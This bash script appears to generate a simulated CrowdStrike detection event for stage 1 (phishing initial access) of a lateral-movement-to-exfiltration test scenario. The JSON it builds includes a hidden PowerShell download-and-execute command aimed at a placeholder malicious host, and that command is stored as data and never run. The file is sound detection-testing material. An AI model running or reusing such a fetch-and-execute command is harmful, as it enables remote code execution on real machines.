#!/usr/bin/env bash
# Lateral Movement to Data Exfiltration - Stage 1: Initial Access
# MITRE ATT&CK: T1566 - Phishing
# Tactic: Initial Access
# Severity: HIGH

SCENARIO_NAME="lateral_to_exfil"
SCENARIO_STAGE=1
SCENARIO_STAGE_NAME="Initial Access"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="HIGH"
SCENARIO_TACTIC="Initial Access"
SCENARIO_TECHNIQUE="T1566"

TIMESTAMP=$(date +%s)
DETECT_ID="cs-stage1-${TIMESTAMP}"

build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-01"
    },
    "process": {
        "user_name": "CORP\\\\attacker",
        "file_name": "outlook.exe",
        "command_line": "powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')\"",
        "sha256": "0000000000000000000000000000000000000000000000000000000000000001"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
